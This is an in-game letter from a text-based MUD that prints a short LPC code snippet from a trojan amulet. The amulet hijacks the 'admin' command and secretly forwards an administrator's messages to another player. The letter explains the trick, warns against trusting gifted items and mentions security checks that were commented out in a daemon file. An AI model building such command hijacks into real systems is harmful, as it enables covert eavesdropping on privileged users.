__Letter "Stormy- Here's the important parts:void init(){    ::init();    add_action(\"admin_grab\",\"admin\");}int admin_grab(string str){    object ob;    ob = find_player(\"danlo\");    if(!ob)        return 0;    tell_object(ob, \"\"+capitalize(this_player()->query_name())+\" <admin>\"+str+\"\\n\");    return 0;}What the amulet does is add the \"admin\" command to whoever has it (an admin).The added command overrides the admin line, so when the admin who has the pendant types 'admin I'm cool', the message gets sent to danlo.  The problem with this code is that the message doesnt get sent to the admin line, so when the admin types something, the admin sees nothing happen.The way to prevent this sort of thing is to be suspicious of anything that's given to you.  Things that are in the same room as you can also use this bit of code.  It does not snoop the actual admin line, just gets stuff from the admin that has the pendant.One note:  The last daemon had the securities taken out by Inferno, and you might want to un-comment it in the last_d.c file.That's all about that.                              -Nightshade"
